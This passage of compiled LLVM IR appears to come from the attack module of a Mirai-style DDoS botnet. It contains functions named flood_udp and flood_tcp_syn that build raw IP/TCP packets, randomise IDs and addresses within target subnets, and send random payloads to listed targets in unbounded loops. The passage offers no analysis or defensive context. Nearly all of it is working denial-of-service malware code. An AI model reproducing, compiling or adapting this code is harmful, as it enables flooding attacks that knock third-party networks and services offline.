  %318 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon* %319 to %struct.anon.0*
  %321 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %320, i32 0, i32 4
  %322 = load i16, i16* %321, align 4
  %323 = and i16 %322, -513
  store i16 %323, i16* %321, align 4
  %324 = load i32, i32* %27, align 4
  %325 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 0
  %327 = bitcast %union.anon* %326 to %struct.anon.0*
  %328 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %327, i32 0, i32 3
  store i32 %324, i32* %328, align 4
  %329 = load i32, i32* %28, align 4
  %330 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %331 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %330, i32 0, i32 0
  %332 = bitcast %union.anon* %331 to %struct.anon.0*
  %333 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %332, i32 0, i32 2
  store i32 %329, i32* %333, align 4
  %334 = call i32 @rand_new()
  %335 = and i32 %334, 65535
  %336 = trunc i32 %335 to i16
  %337 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i32 0, i32 3
  store i16 %336, i16* %338, align 4
  %339 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 7
  store i16 0, i16* %340, align 2
  %341 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %342 = bitcast %struct.iphdr* %341 to i16*
  %343 = call zeroext i16 @checksum_generic(i16* %342, i32 20)
  %344 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %345 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %344, i32 0, i32 7
  store i16 %343, i16* %345, align 2
  %346 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %347 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %346, i32 0, i32 0
  %348 = bitcast %union.anon* %347 to %struct.anon.0*
  %349 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %348, i32 0, i32 6
  store i16 0, i16* %349, align 4
  %350 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %351 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %352 = bitcast %struct.tcphdr* %351 to i8*
  %353 = call zeroext i16 @htons(i16 zeroext 20) #7
  %354 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %350, i8* %352, i16 zeroext %353, i32 20)
  %355 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %356 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %355, i32 0, i32 0
  %357 = bitcast %union.anon* %356 to %struct.anon.0*
  %358 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %357, i32 0, i32 6
  store i16 %354, i16* %358, align 4
  %359 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 0
  store i16 2, i16* %359, align 4
  %360 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %361 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %360, i32 0, i32 0
  %362 = bitcast %union.anon* %361 to %struct.anon.0*
  %363 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %362, i32 0, i32 1
  %364 = load i16, i16* %363, align 2
  %365 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %364, i16* %365, align 2
  %366 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %367 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %366, i32 0, i32 9
  %368 = load i32, i32* %367, align 4
  %369 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %370 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %369, i32 0, i32 0
  store i32 %368, i32* %370, align 4
  %371 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %372 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %371, i32 0, i32 0
  %373 = bitcast %union.anon* %372 to %struct.anon.0*
  %374 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %373, i32 0, i32 3
  %375 = load i32, i32* %374, align 4
  %376 = call i32 @ntohl(i32 %375) #7
  %377 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %378 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %377, i32 0, i32 0
  %379 = bitcast %union.anon* %378 to %struct.anon.0*
  %380 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %379, i32 0, i32 2
  %381 = load i32, i32* %380, align 4
  %382 = call i32 @ntohl(i32 %381) #7
  %383 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0), i32 %376, i32 %382)
  %384 = load i32, i32* %8, align 4
  %385 = getelementptr inbounds [40 x i8], [40 x i8]* %17, i64 0, i64 0
  %386 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %387 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  store %struct.sockaddr* %387, %struct.sockaddr** %386, align 8
  %388 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %389 = load %struct.sockaddr*, %struct.sockaddr** %388, align 8
  %390 = call i64 @sendto(i32 %384, i8* %385, i64 40, i32 16384, %struct.sockaddr* %389, i32 16)
  %391 = trunc i64 %390 to i32
  store i32 %391, i32* %22, align 4
  br label %395

392:                                              ; preds = %245, %235, %229
  %393 = load i32, i32* %24, align 4
  %394 = add nsw i32 %393, 1
  store i32 %394, i32* %24, align 4
  br label %215, !llvm.loop !10

395:                                              ; preds = %255, %228, %215
  %396 = load i32, i32* %22, align 4
  %397 = icmp eq i32 %396, -1
  %398 = zext i1 %397 to i64
  %399 = select i1 %397, i32 0, i32 1
  store i32 %399, i32* %6, align 4
  br label %400

400:                                              ; preds = %395, %213, %199
  %401 = load i32, i32* %6, align 4
  ret i32 %401
}

declare i32 @rand_new() #2

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #3

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #4

declare i32 @printf(i8*, ...) #2

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32) #1

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #5

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #2

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @flood_udp(%struct.arguments* %0) #0 {
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i16, align 2
  %4 = alloca i16, align 2
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i32*, align 8
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i16 0, i16* %3, align 2
  store i16 0, i16* %4, align 2
  store i32 0, i32* %5, align 4
  %12 = load %struct.arguments*, %struct.arguments** %2, align 8
  %13 = getelementptr inbounds %struct.arguments, %struct.arguments* %12, i32 0, i32 1
  %14 = load %struct.option*, %struct.option** %13, align 8
  %15 = load %struct.arguments*, %struct.arguments** %2, align 8
  %16 = getelementptr inbounds %struct.arguments, %struct.arguments* %15, i32 0, i32 2
  %17 = load i8, i8* %16, align 8
  %18 = call zeroext i16 @retrieve_opt_num(%struct.option* %14, i8 zeroext %17, i8 zeroext 2, i16 zeroext 900)
  store i16 %18, i16* %3, align 2
  %19 = load %struct.arguments*, %struct.arguments** %2, align 8
  %20 = getelementptr inbounds %struct.arguments, %struct.arguments* %19, i32 0, i32 1
  %21 = load %struct.option*, %struct.option** %20, align 8
  %22 = load %struct.arguments*, %struct.arguments** %2, align 8
  %23 = getelementptr inbounds %struct.arguments, %struct.arguments* %22, i32 0, i32 2
  %24 = load i8, i8* %23, align 8
  %25 = call zeroext i16 @retrieve_opt_num(%struct.option* %21, i8 zeroext %24, i8 zeroext 1, i16 zeroext -1)
  store i16 %25, i16* %4, align 2
  %26 = load %struct.arguments*, %struct.arguments** %2, align 8
  %27 = getelementptr inbounds %struct.arguments, %struct.arguments* %26, i32 0, i32 3
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias align 16 i8* @calloc(i64 %29, i64 8) #8
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %6, align 8
  %32 = load i8**, i8*** %6, align 8
  %33 = icmp ne i8** %32, null
  br i1 %33, label %35, label %34

34:                                               ; preds = %1
  call void @exit(i32 1) #9
  unreachable

35:                                               ; preds = %1
  %36 = load %struct.arguments*, %struct.arguments** %2, align 8
  %37 = getelementptr inbounds %struct.arguments, %struct.arguments* %36, i32 0, i32 3
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias align 16 i8* @calloc(i64 %39, i64 4) #8
  %41 = bitcast i8* %40 to i32*
  store i32* %41, i32** %7, align 8
  %42 = load i32*, i32** %7, align 8
  %43 = icmp ne i32* %42, null
  br i1 %43, label %45, label %44

44:                                               ; preds = %35
  call void @exit(i32 1) #9
  unreachable

45:                                               ; preds = %35
  store i32 0, i32* %5, align 4
  br label %46

46:                                               ; preds = %167, %45
  %47 = load i32, i32* %5, align 4
  %48 = load %struct.arguments*, %struct.arguments** %2, align 8
  %49 = getelementptr inbounds %struct.arguments, %struct.arguments* %48, i32 0, i32 3
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp slt i32 %47, %51
  br i1 %52, label %53, label %170

53:                                               ; preds = %46
  %54 = call i32 @socket(i32 2, i32 2, i32 0) #8
  %55 = load i32*, i32** %7, align 8
  %56 = load i32, i32* %5, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i32, i32* %55, i64 %57
  store i32 %54, i32* %58, align 4
  %59 = load i32*, i32** %7, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i32, i32* %59, i64 %61
  %63 = load i32, i32* %62, align 4
  %64 = icmp eq i32 %63, -1
  br i1 %64, label %65, label %66

65:                                               ; preds = %53
  call void @exit(i32 1) #9
  unreachable

66:                                               ; preds = %53
  %67 = load i16, i16* %3, align 2
  %68 = zext i16 %67 to i32
  %69 = add nsw i32 %68, 1
  %70 = sext i32 %69 to i64
  %71 = call noalias align 16 i8* @malloc(i64 %70) #8
  %72 = load i8**, i8*** %6, align 8
  %73 = load i32, i32* %5, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8*, i8** %72, i64 %74
  store i8* %71, i8** %75, align 8
  %76 = load i8**, i8*** %6, align 8
  %77 = load i32, i32* %5, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8*, i8** %76, i64 %78
  %80 = load i8*, i8** %79, align 8
  %81 = icmp ne i8* %80, null
  br i1 %81, label %83, label %82

82:                                               ; preds = %66
  call void @exit(i32 1) #9
  unreachable

83:                                               ; preds = %66
  %84 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %84, align 4
  %85 = call i32 @rand_new()
  %86 = trunc i32 %85 to i16
  %87 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %86, i16* %87, align 2
  %88 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %89 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %88, i32 0, i32 0
  store i32 0, i32* %89, align 4
  %90 = load i32*, i32** %7, align 8
  %91 = load i32, i32* %5, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i32, i32* %90, i64 %92
  %94 = load i32, i32* %93, align 4
  %95 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %96 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  store %struct.sockaddr* %96, %struct.sockaddr** %95, align 8
  %97 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %98 = load %struct.sockaddr*, %struct.sockaddr** %97, align 8
  %99 = call i32 @bind(i32 %94, %struct.sockaddr* %98, i32 16) #8
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %100, align 4
  %101 = load i16, i16* %4, align 2
  %102 = call zeroext i16 @htons(i16 zeroext %101) #7
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %102, i16* %103, align 2
  %104 = load %struct.arguments*, %struct.arguments** %2, align 8
  %105 = getelementptr inbounds %struct.arguments, %struct.arguments* %104, i32 0, i32 0
  %106 = load %struct.target*, %struct.target** %105, align 8
  %107 = load i32, i32* %5, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.target, %struct.target* %106, i64 %108
  %110 = getelementptr inbounds %struct.target, %struct.target* %109, i32 0, i32 1
  %111 = load i16, i16* %110, align 4
  %112 = zext i16 %111 to i32
  %113 = icmp slt i32 %112, 32
  br i1 %113, label %114, label %137

114:                                              ; preds = %83
  %115 = load %struct.arguments*, %struct.arguments** %2, align 8
  %116 = getelementptr inbounds %struct.arguments, %struct.arguments* %115, i32 0, i32 0
  %117 = load %struct.target*, %struct.target** %116, align 8
  %118 = load i32, i32* %5, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.target, %struct.target* %117, i64 %119
  %121 = getelementptr inbounds %struct.target, %struct.target* %120, i32 0, i32 0
  %122 = load i32, i32* %121, align 4
  %123 = call i32 @ntohl(i32 %122) #7
  %124 = call i32 @rand_new()
  %125 = load %struct.arguments*, %struct.arguments** %2, align 8
  %126 = getelementptr inbounds %struct.arguments, %struct.arguments* %125, i32 0, i32 0
  %127 = load %struct.target*, %struct.target** %126, align 8
  %128 = load i32, i32* %5, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.target, %struct.target* %127, i64 %129
  %131 = getelementptr inbounds %struct.target, %struct.target* %130, i32 0, i32 1
  %132 = load i16, i16* %131, align 4
  %133 = zext i16 %132 to i32
  %134 = lshr i32 %124, %133
  %135 = add i32 %123, %134
  %136 = call i32 @htonl(i32 %135) #7
  br label %146

137:                                              ; preds = %83
  %138 = load %struct.arguments*, %struct.arguments** %2, align 8
  %139 = getelementptr inbounds %struct.arguments, %struct.arguments* %138, i32 0, i32 0
  %140 = load %struct.target*, %struct.target** %139, align 8
  %141 = load i32, i32* %5, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.target, %struct.target* %140, i64 %142
  %144 = getelementptr inbounds %struct.target, %struct.target* %143, i32 0, i32 0
  %145 = load i32, i32* %144, align 4
  br label %146

146:                                              ; preds = %137, %114
  %147 = phi i32 [ %136, %114 ], [ %145, %137 ]
  %148 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %149 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %148, i32 0, i32 0
  store i32 %147, i32* %149, align 4
  %150 = load i32*, i32** %7, align 8
  %151 = load i32, i32* %5, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds i32, i32* %150, i64 %152
  %154 = load i32, i32* %153, align 4
  %155 = bitcast %union.__CONST_SOCKADDR_ARG* %11 to %struct.sockaddr**
  %156 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %156, %struct.sockaddr** %155, align 8
  %157 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %11, i32 0, i32 0
  %158 = load %struct.sockaddr*, %struct.sockaddr** %157, align 8
  %159 = call i32 @connect(i32 %154, %struct.sockaddr* %158, i32 16)
  %160 = load i8**, i8*** %6, align 8
  %161 = load i32, i32* %5, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i8*, i8** %160, i64 %162
  %164 = load i8*, i8** %163, align 8
  %165 = load i16, i16* %3, align 2
  %166 = zext i16 %165 to i32
  call void @rand_string(i8* %164, i32 %166)
  br label %167

167:                                              ; preds = %146
  %168 = load i32, i32* %5, align 4
  %169 = add nsw i32 %168, 1
  store i32 %169, i32* %5, align 4
  br label %46, !llvm.loop !11

170:                                              ; preds = %46
  br label %171

171:                                              ; preds = %170, %196
  store i32 0, i32* %5, align 4
  br label %172

172:                                              ; preds = %193, %171
  %173 = load i32, i32* %5, align 4
  %174 = load %struct.arguments*, %struct.arguments** %2, align 8
  %175 = getelementptr inbounds %struct.arguments, %struct.arguments* %174, i32 0, i32 3
  %176 = load i8, i8* %175, align 1
  %177 = zext i8 %176 to i32
  %178 = icmp slt i32 %173, %177
  br i1 %178, label %179, label %196

179:                                              ; preds = %172
  %180 = load i32*, i32** %7, align 8
  %181 = load i32, i32* %5, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds i32, i32* %180, i64 %182
  %184 = load i32, i32* %183, align 4
  %185 = load i8**, i8*** %6, align 8
  %186 = load i32, i32* %5, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds i8*, i8** %185, i64 %187
  %189 = load i8*, i8** %188, align 8
  %190 = load i16, i16* %3, align 2
  %191 = zext i16 %190 to i64
  %192 = call i64 @send(i32 %184, i8* %189, i64 %191, i32 16384)
  br label %193

193:                                              ; preds = %179
  %194 = load i32, i32* %5, align 4
  %195 = add nsw i32 %194, 1
  store i32 %195, i32* %5, align 4
  br label %172, !llvm.loop !12

196:                                              ; preds = %172
  br label %171
}

declare zeroext i16 @retrieve_opt_num(%struct.option*, i8 zeroext, i8 zeroext, i16 zeroext) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #5

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #5

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #5

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

declare void @rand_string(i8*, i32) #2

declare i64 @send(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @flood_tcp_syn(%struct.arguments* %0) #0 {
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca i16, align 2
  %7 = alloca i8, align 1
  %8 = alloca i16, align 2
  %9 = alloca i8**, align 8
  %10 = alloca i8, align 1
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  %13 = alloca i8, align 1
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32*, align 8
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.tcphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca %struct.sockaddr_in, align 4
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  store i16 0, i16* %5, align 2
  store i16 0, i16* %6, align 2
  store i8 0, i8* %7, align 1
  store i16 0, i16* %8, align 2
  store i8 0, i8* %10, align 1
  store i8 0, i8* %11, align 1
  store i8 0, i8* %12, align 1
  store i8 0, i8* %13, align 1
  store i8 0, i8* %14, align 1
  store i8 0, i8* %15, align 1
  store i8 0, i8* %16, align 1
  store i16 0, i16* %17, align 2
  store i32 0, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  store i32 0, i32* %23, align 4
  %31 = load %struct.arguments*, %struct.arguments** %2, align 8
  %32 = getelementptr inbounds %struct.arguments, %struct.arguments* %31, i32 0, i32 1
  %33 = load %struct.option*, %struct.option** %32, align 8
  %34 = load %struct.arguments*, %struct.arguments** %2, align 8
  %35 = getelementptr inbounds %struct.arguments, %struct.arguments* %34, i32 0, i32 2
  %36 = load i8, i8* %35, align 8
  %37 = call zeroext i16 @retrieve_opt_num(%struct.option* %33, i8 zeroext %36, i8 zeroext 2, i16 zeroext 900)
  store i16 %37, i16* %5, align 2
  %38 = load %struct.arguments*, %struct.arguments** %2, align 8
  %39 = getelementptr inbounds %struct.arguments, %struct.arguments* %38, i32 0, i32 1
  %40 = load %struct.option*, %struct.option** %39, align 8
  %41 = load %struct.arguments*, %struct.arguments** %2, align 8
  %42 = getelementptr inbounds %struct.arguments, %struct.arguments* %41, i32 0, i32 2
  %43 = load i8, i8* %42, align 8
  %44 = call zeroext i16 @retrieve_opt_num(%struct.option* %40, i8 zeroext %43, i8 zeroext 1, i16 zeroext -1)
  store i16 %44, i16* %6, align 2
  %45 = load %struct.arguments*, %struct.arguments** %2, align 8
  %46 = getelementptr inbounds %struct.arguments, %struct.arguments* %45, i32 0, i32 1
  %47 = load %struct.option*, %struct.option** %46, align 8
  %48 = load %struct.arguments*, %struct.arguments** %2, align 8
  %49 = getelementptr inbounds %struct.arguments, %struct.arguments* %48, i32 0, i32 2
  %50 = load i8, i8* %49, align 8
  %51 = call zeroext i16 @retrieve_opt_num(%struct.option* %47, i8 zeroext %50, i8 zeroext 7, i16 zeroext 255)
  %52 = trunc i16 %51 to i8
  store i8 %52, i8* %7, align 1
  %53 = load %struct.arguments*, %struct.arguments** %2, align 8
  %54 = getelementptr inbounds %struct.arguments, %struct.arguments* %53, i32 0, i32 1
  %55 = load %struct.option*, %struct.option** %54, align 8
  %56 = load %struct.arguments*, %struct.arguments** %2, align 8
  %57 = getelementptr inbounds %struct.arguments, %struct.arguments* %56, i32 0, i32 2
  %58 = load i8, i8* %57, align 8
  %59 = call zeroext i16 @retrieve_opt_num(%struct.option* %55, i8 zeroext %58, i8 zeroext 8, i16 zeroext -1)
  store i16 %59, i16* %8, align 2
  %60 = load %struct.arguments*, %struct.arguments** %2, align 8
  %61 = getelementptr inbounds %struct.arguments, %struct.arguments* %60, i32 0, i32 1
  %62 = load %struct.option*, %struct.option** %61, align 8
  %63 = load %struct.arguments*, %struct.arguments** %2, align 8
  %64 = getelementptr inbounds %struct.arguments, %struct.arguments* %63, i32 0, i32 2
  %65 = load i8, i8* %64, align 8
  %66 = call zeroext i16 @retrieve_opt_num(%struct.option* %62, i8 zeroext %65, i8 zeroext 9, i16 zeroext 0)
  %67 = trunc i16 %66 to i8
  store i8 %67, i8* %10, align 1
  %68 = load %struct.arguments*, %struct.arguments** %2, align 8
  %69 = getelementptr inbounds %struct.arguments, %struct.arguments* %68, i32 0, i32 1
  %70 = load %struct.option*, %struct.option** %69, align 8
  %71 = load %struct.arguments*, %struct.arguments** %2, align 8
  %72 = getelementptr inbounds %struct.arguments, %struct.arguments* %71, i32 0, i32 2
  %73 = load i8, i8* %72, align 8
  %74 = call zeroext i16 @retrieve_opt_num(%struct.option* %70, i8 zeroext %73, i8 zeroext 10, i16 zeroext 0)
  %75 = trunc i16 %74 to i8
  store i8 %75, i8* %11, align 1
  %76 = load %struct.arguments*, %struct.arguments** %2, align 8
  %77 = getelementptr inbounds %struct.arguments, %struct.arguments* %76, i32 0, i32 1
  %78 = load %struct.option*, %struct.option** %77, align 8
  %79 = load %struct.arguments*, %struct.arguments** %2, align 8
  %80 = getelementptr inbounds %struct.arguments, %struct.arguments* %79, i32 0, i32 2
  %81 = load i8, i8* %80, align 8
  %82 = call zeroext i16 @retrieve_opt_num(%struct.option* %78, i8 zeroext %81, i8 zeroext 11, i16 zeroext 0)
  %83 = trunc i16 %82 to i8
  store i8 %83, i8* %12, align 1
  %84 = load %struct.arguments*, %struct.arguments** %2, align 8
  %85 = getelementptr inbounds %struct.arguments, %struct.arguments* %84, i32 0, i32 1
  %86 = load %struct.option*, %struct.option** %85, align 8
  %87 = load %struct.arguments*, %struct.arguments** %2, align 8
  %88 = getelementptr inbounds %struct.arguments, %struct.arguments* %87, i32 0, i32 2
  %89 = load i8, i8* %88, align 8
  %90 = call zeroext i16 @retrieve_opt_num(%struct.option* %86, i8 zeroext %89, i8 zeroext 12, i16 zeroext 0)
  %91 = trunc i16 %90 to i8
  store i8 %91, i8* %13, align 1
  %92 = load %struct.arguments*, %struct.arguments** %2, align 8
  %93 = getelementptr inbounds %struct.arguments, %struct.arguments* %92, i32 0, i32 1
  %94 = load %struct.option*, %struct.option** %93, align 8
  %95 = load %struct.arguments*, %struct.arguments** %2, align 8
  %96 = getelementptr inbounds %struct.arguments, %struct.arguments* %95, i32 0, i32 2
  %97 = load i8, i8* %96, align 8
  %98 = call zeroext i16 @retrieve_opt_num(%struct.option* %94, i8 zeroext %97, i8 zeroext 13, i16 zeroext 0)
  %99 = trunc i16 %98 to i8
  store i8 %99, i8* %14, align 1
  %100 = load %struct.arguments*, %struct.arguments** %2, align 8
  %101 = getelementptr inbounds %struct.arguments, %struct.arguments* %100, i32 0, i32 1
  %102 = load %struct.option*, %struct.option** %101, align 8
  %103 = load %struct.arguments*, %struct.arguments** %2, align 8
  %104 = getelementptr inbounds %struct.arguments, %struct.arguments* %103, i32 0, i32 2
  %105 = load i8, i8* %104, align 8
  %106 = call zeroext i16 @retrieve_opt_num(%struct.option* %102, i8 zeroext %105, i8 zeroext 14, i16 zeroext 1)
  %107 = trunc i16 %106 to i8
  store i8 %107, i8* %15, align 1
  %108 = load %struct.arguments*, %struct.arguments** %2, align 8
  %109 = getelementptr inbounds %struct.arguments, %struct.arguments* %108, i32 0, i32 1
  %110 = load %struct.option*, %struct.option** %109, align 8
  %111 = load %struct.arguments*, %struct.arguments** %2, align 8
  %112 = getelementptr inbounds %struct.arguments, %struct.arguments* %111, i32 0, i32 2
  %113 = load i8, i8* %112, align 8
  %114 = call zeroext i16 @retrieve_opt_num(%struct.option* %110, i8 zeroext %113, i8 zeroext 15, i16 zeroext 0)
  %115 = trunc i16 %114 to i8
  store i8 %115, i8* %16, align 1
  %116 = load %struct.arguments*, %struct.arguments** %2, align 8
  %117 = getelementptr inbounds %struct.arguments, %struct.arguments* %116, i32 0, i32 1
  %118 = load %struct.option*, %struct.option** %117, align 8
  %119 = load %struct.arguments*, %struct.arguments** %2, align 8
  %120 = getelementptr inbounds %struct.arguments, %struct.arguments* %119, i32 0, i32 2
  %121 = load i8, i8* %120, align 8
  %122 = call zeroext i16 @retrieve_opt_num(%struct.option* %118, i8 zeroext %121, i8 zeroext 16, i16 zeroext -1)
  store i16 %122, i16* %17, align 2
  %123 = load %struct.arguments*, %struct.arguments** %2, align 8
  %124 = getelementptr inbounds %struct.arguments, %struct.arguments* %123, i32 0, i32 1
  %125 = load %struct.option*, %struct.option** %124, align 8
  %126 = load %struct.arguments*, %struct.arguments** %2, align 8
  %127 = getelementptr inbounds %struct.arguments, %struct.arguments* %126, i32 0, i32 2
  %128 = load i8, i8* %127, align 8
  %129 = call zeroext i16 @retrieve_opt_num(%struct.option* %125, i8 zeroext %128, i8 zeroext 17, i16 zeroext -1)
  %130 = zext i16 %129 to i32
  store i32 %130, i32* %18, align 4
  %131 = load %struct.arguments*, %struct.arguments** %2, align 8
  %132 = getelementptr inbounds %struct.arguments, %struct.arguments* %131, i32 0, i32 1
  %133 = load %struct.option*, %struct.option** %132, align 8
  %134 = load %struct.arguments*, %struct.arguments** %2, align 8
  %135 = getelementptr inbounds %struct.arguments, %struct.arguments* %134, i32 0, i32 2
  %136 = load i8, i8* %135, align 8
  %137 = load i32, i32* @LOCAL_ADDRESS, align 4
  %138 = call i32 @retrieve_opt_ipv4(%struct.option* %133, i8 zeroext %136, i8 zeroext 18, i32 %137)
  store i32 %138, i32* %19, align 4
  %139 = load %struct.arguments*, %struct.arguments** %2, align 8
  %140 = getelementptr inbounds %struct.arguments, %struct.arguments* %139, i32 0, i32 1
  %141 = load %struct.option*, %struct.option** %140, align 8
  %142 = load %struct.arguments*, %struct.arguments** %2, align 8
  %143 = getelementptr inbounds %struct.arguments, %struct.arguments* %142, i32 0, i32 2
  %144 = load i8, i8* %143, align 8
  %145 = call zeroext i16 @retrieve_opt_num(%struct.option* %141, i8 zeroext %144, i8 zeroext 19, i16 zeroext -1)
  %146 = zext i16 %145 to i32
  store i32 %146, i32* %20, align 4
  %147 = load %struct.arguments*, %struct.arguments** %2, align 8
  %148 = getelementptr inbounds %struct.arguments, %struct.arguments* %147, i32 0, i32 1
  %149 = load %struct.option*, %struct.option** %148, align 8
  %150 = load %struct.arguments*, %struct.arguments** %2, align 8
  %151 = getelementptr inbounds %struct.arguments, %struct.arguments* %150, i32 0, i32 2
